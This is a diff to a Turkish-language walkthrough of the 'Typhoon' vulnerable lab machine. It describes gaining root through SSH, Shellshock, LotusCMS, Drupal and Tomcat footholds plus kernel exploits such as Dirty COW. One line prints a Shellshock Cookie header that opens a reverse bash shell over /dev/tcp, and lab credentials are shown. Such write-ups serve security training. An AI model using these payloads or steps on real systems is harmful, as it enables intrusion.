@@ -22,6 +22,14 @@ SSH ile güzel bir başlangıç yaptık. Bulduğum bilgilerle giriş yapmayı de
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/3.PNG)
 
+uname -a komutu ile sistem bilgilerini çektim ve biraz araştırma yaptığımda yetki yükseltme zafiyetine sahip olduğunu fark ettim. https://www.exploit-db.com/exploits/37292
+
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/sshuname.png)
+
+Bulduğum exploit’i kendi makinemden hedef makineye wget yardımıyla çekerek gcc ile derleyip çalıştırdım.
+
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/sshexploit.png)
+
 # HTTP
 
 80 portunda bir Apache server'ı çalıştığını görmüştüm, bir taraftan sayfayı kurcalarken diğer taraftan nikto ve dirb toollarını bilgi toplamaları için çalıştırdım.
@@ -60,6 +68,14 @@ Cookie:() { :;}; echo; /bin/bash -i >& /dev/tcp/192.168.44.128/5555 0>&1
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/7.png)
 
+ssh'da kullandığım exploit çalışmadı biraz araştırmayla "Dirty COW" adlı başka bir exploit buldum. Exploit'i kendi makineme indirip derlerken hata aldım fakat kullanılabilir durumdaydı bu yüzden hedef makineye çektim.
+
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/shellshockgcc.png)
+
+Daha sonra exploit'i çalıştırınca root yetkisini elde ettim.
+
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/shellshockexploit.png)
+
 # robot.txt ve MongoDB
 
 Web Crawler'ların erişmemesi için robot.txt'ye MongoDB dizini eklendiğini gördüm. Böylece MongoDB dizininden haberim oldu ve dizine gittiğimde bazı yararlı bilgilerle karşılaştım.
@@ -68,7 +84,9 @@ robot.txt ---> ![Octocat](https://raw.githubusercontent.com/gorkemozkanat/Typhoo
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/9.png)
 
-ıd:typhoon pw:789456123 bilgileri ile ssh a girilebilir.
+ıd:typhoon pw:789456123 bilgilerini kullanarak ssh servisi ile bağlandım. Daha önce kullandığım exploit burda da kullanılabilir durumdaydı ve bahsi geçen exploit yardımıyla root yetkisini aldım.
+
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/typhoonexploit.png)
 
 # CMS
 
@@ -80,13 +98,15 @@ LotusCMS hakkında biraz araştırma yaptım ve Exploit Database'de bir RCE zaaf
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/11.png)
 
-Metasploit Framework kullanarak zafiyeti istismar etmeye çalıştım.
+Metasploit Framework kullanarak zafiyeti istismar etmeye çalıştım ve meterpreter session'nı aldım.
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/12.png)
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/13.png)
 
-ve meterpreter session nı aldım.
+Daha önceki zafiyetlerde kullandığım exploit'i bu zafiyette de kullanarak root yetkisini elde ettim.
+
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/cmsexploityeni.png)
 
 # drupal
 
@@ -94,11 +114,11 @@ drupal dizinine gidip sayfanın kaynağını görüntülediğimde drupal ın dru
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/17.png)
 
-Metasploit Framework de drupal 8 için görünen exploitleri denemeye başladım ve drupal_drupalgeddon2 isimli exploit ile sonuca ulaşabildim.
+Metasploit Framework de drupal 8 için görünen exploitleri denemeye başladım ve drupal_drupalgeddon2 isimli exploit ile meterpreter session'ını aldım. Daha önce kullandığım exploit burda da işe yaradı ve root yetkisini elde ettim.
 
-![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/18.png)
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/drupalexploityeni.png)
 
-#phpMyAdmin
+# phpMyAdmin
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/14.png)
 
@@ -144,23 +164,12 @@ Metasploit Framework da bulunan tomcat_mgr_login modülü ile 8080 portunda bulu
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/24.PNG)
 
-Bulmuş olduğum tomcat:tomcat bilgisi ile tomcat_mgr_upload modülünü kullanarak meterpreter shell'i elde ettim.
+Bulmuş olduğum tomcat:tomcat bilgisi ile tomcat_mgr_upload modülünü kullanarak meterpreter shell'i elde ettim. Daha sonra privilege escalation için kullandığım exploit ile root yetkisini elde ettim.
 
-![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/25.png)
-
-# Privilege Escalation
-
-uname -a komutu ile sistem bilgilerini çektim ve biraz araştırma yaptığımda yetki yükseltme zafiyetine sahip olduğunu fark ettim. https://www.exploit-db.com/exploits/37292
-
-![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/26.png)
-
-Bulduğum exploit'i kendi makinemden hedef makineye wget yardımıyla çekerek gcc ile derleyip çalıştırdım.
-
-![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/28.png)
-
-Başarılı bir şekilde root oldum ve /root dizinindeki flag'i okudum.
+![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/tomcatexploit.png)
 
 ![Branching](https://raw.githubusercontent.com/gorkemozkanat/Typhoon/main/images/lastflag.png)
+
 
 
 ### Teşekkürler, Başka Makinelerde Görüşmek Üzere.
